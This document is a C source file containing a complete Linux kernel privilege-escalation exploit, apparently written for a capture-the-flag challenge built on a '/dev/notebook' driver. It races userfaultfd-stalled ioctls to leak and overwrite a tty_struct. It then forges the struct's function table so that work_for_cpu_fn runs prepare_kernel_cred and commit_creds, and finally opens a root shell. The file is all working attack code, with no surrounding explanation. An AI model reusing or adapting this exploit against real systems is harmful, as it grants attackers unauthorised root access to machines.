#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <syscall.h>
#include <poll.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <stdint.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <assert.h>

#define PAGE_SIZE 0x1000
#define TTY_STRUCT_SZIE 0x2E0

size_t work_for_cpu_fn_off = 0xffffffff8949eb90 - 0xffffffff8a28e440;
size_t prepare_kernel_cred_off = 0xffffffffa14a9ef0 - 0xffffffffa228e440;
size_t commit_creds_off = 0xffffffffa14a9b40 - 0xffffffffa228e440;
size_t kernel_base;

struct userarg
{
    size_t idx;
    size_t size;
    void *buf;
};

int note_fd;
void *stuck_mapped_memory;

void errExit(char *errMsg)
{
    puts(errMsg);
    exit(-1);
}

void RegisterUserfault(void *fault_page, void* handler)
{
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features    = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        errExit("[-] ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; //我们要监视的区域
    ur.range.len   = PAGE_SIZE;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) //注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
        errExit("[-] ioctl-UFFDIO_REGISTER");
    //开一个线程，接收错误的信号，然后处理
    int s = pthread_create(&thr, NULL, handler, (void*)uffd);
    if (s != 0)
        errExit("[-] pthread_create");
}

void notegift(void *buf)
{
    struct userarg arg;
    arg.idx = 0;
    arg.size = 0;
    arg.buf = buf;
    ioctl(note_fd, 0x64, &arg);
}

void noteadd(size_t idx, size_t size, void *buf)
{
    struct userarg arg;
    arg.idx = idx;
    arg.size = size;
    arg.buf = buf;
    ioctl(note_fd, 0x100, &arg);
}

void notedel(size_t idx)
{
    struct userarg arg;
    arg.idx = idx;
    arg.size = 0;
    arg.buf = NULL;
    ioctl(note_fd, 0x200, &arg);
}

void noteedit(size_t idx, size_t size, void *buf)
{
    struct userarg arg;
    arg.idx = idx;
    arg.size = size;
    arg.buf = buf;
    ioctl(note_fd, 0x300, &arg);
}

void openDev()
{
    note_fd = open("/dev/notebook", O_RDWR);
    if (note_fd < 0)
        errExit("[-] open notebook device error!");
}

void* userfaultfd_sleep3_handler(void *arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long) arg;
    puts("[+] sleep3 handler created");
    int nready;
    struct pollfd pollfd;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    puts("[+] sleep3 handler unblocked");
    sleep(3);
    if (nready != 1)
    {
        errExit("[-] Wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0)
    {
        errExit("[-] msg err");
    }

    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        errExit("[-] mmap err");
    }
    struct uffdio_copy uc;
    // init page
    memset(page, 0, sizeof(page));
    uc.src = (unsigned long) page;
    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    puts("[+] sleep3 handler done");
    return NULL;
}

void* userfaultfd_stuck_handler(void* arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long) arg;
    puts("[+] stuck handler created");
    int nready;
    struct pollfd pollfd;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    puts("[+] stuck handler unblocked");
    pause();
    if (nready != 1)
    {
        errExit("[-] Wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0)
    {
        errExit("[-] msg err");
    }

    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        errExit("[-] mmap err");
    }
    struct uffdio_copy uc;
    // init page
    memset(page, 0, sizeof(page));
    uc.src = (unsigned long) page;
    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    puts("[+] stuck handler done");
    return NULL;
}

void edit_thread(int idx)
{
    puts("[+] edit thread start!");
    noteedit(idx, 0, stuck_mapped_memory);
    puts("[+] edit thread end!");               // won't reach here
    return NULL;
}

void add_thread(int idx)
{
    puts("[+] add thread start!");
    noteadd(idx, 0x60, stuck_mapped_memory);
    puts("[+] add thread end!");                // won't reach here
    return NULL;
}

char buf_a[0x500] = {"aaa"};
size_t buf_tty[0x100], buf_fake_table[0x500];
int main()
{
    int pid, tty_fd;
    stuck_mapped_memory = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);
    openDev();
    noteadd(0, 0x60, buf_a);
    noteadd(1, 0x60, buf_a);
    noteedit(1, 0x500, buf_a);
    noteedit(0, TTY_STRUCT_SZIE, buf_a);
    write(note_fd, buf_a, 0);

    pthread_t thr_edit, thr_add;
    pthread_create(&thr_edit, NULL, edit_thread, 0);
    sleep(1);
    pthread_create(&thr_add, NULL, add_thread, 0);
    sleep(1);
    puts("[+] ready to open ptmx.");
    for (int i = 0; i < 20; i++)
    {
        tty_fd = open("/dev/ptmx", O_RDWR);
        if (tty_fd < 0)
            errExit("[-] open ptmx device error!");
        read(note_fd, buf_tty, 0);
        if (buf_tty[0] == 0x100005401)
        {
            printf("[+] tty_struct found!\n[+] fd = %d.\n", tty_fd);
            break;
        }
    }
    if (buf_tty[0] != 0x100005401)
        errExit("[-] leak failed!");
    size_t ptm_unix98_ops_addr = buf_tty[3];
    if ((ptm_unix98_ops_addr & 0xfff) == 0x320)
        ptm_unix98_ops_addr += 0x120;
    size_t work_for_cpu_fn_addr = work_for_cpu_fn_off + ptm_unix98_ops_addr;
    size_t tty_struct_addr = buf_tty[10] - 0x50;
    size_t commit_creds_addr = commit_creds_off + ptm_unix98_ops_addr;
    size_t prepare_kernel_cred_addr = prepare_kernel_cred_off + ptm_unix98_ops_addr;
    kernel_base = prepare_kernel_cred_addr - 0xa9ef0;
    printf("ptm_unix98_ops_addr: %lx.\n", ptm_unix98_ops_addr);
    printf("work_for_cpu_fn_addr: %lx.\n", work_for_cpu_fn_addr);
    printf("commit_creds_addr: %lx.\n", commit_creds_addr);
    printf("prepare_kernel_cred_addr: %lx.\n", prepare_kernel_cred_addr);

    size_t buf_gift[0x100];
    notegift(buf_gift);
    size_t note_0_addr = buf_gift[0], note_1_addr = buf_gift[2];
    assert(note_0_addr == tty_struct_addr);
    printf("[+] note_1_addr: %lx.\n", note_1_addr);

    buf_tty[0] = 0x100005401;
    buf_tty[3] = note_1_addr;
    buf_tty[4] = prepare_kernel_cred_addr;  // ptr
    buf_tty[5] = 0;                         // arg1
    write(note_fd, buf_tty, 0);             // write to tty_struct

    buf_fake_table[7] = work_for_cpu_fn_addr;
    buf_fake_table[10] = work_for_cpu_fn_addr;
    buf_fake_table[12] = work_for_cpu_fn_addr;
    write(note_fd, buf_fake_table, 1);      // write to tty_struct.vtable

    ioctl(tty_fd, 233, 233);
    read(note_fd, buf_tty, 0);
    printf("[+] prepare_kernel_cred finished, return 0x%lx.\n", buf_tty[6]);
    
    buf_tty[0] = 0x100005401;
    buf_tty[3] = note_1_addr;
    buf_tty[4] = commit_creds_addr;         // ptr
    buf_tty[5] = buf_tty[6];                // arg1
    write(note_fd, buf_tty, 0);
    sleep(1);
    ioctl(tty_fd, 233, 233);

    printf("[+] now uid = %d\n", getuid());
    if (getuid() == 0)
    {
        puts("[+] root now!");
        system("/bin/sh");
    }
    else
        errExit("[-] get root failed!");

    return 0;
}
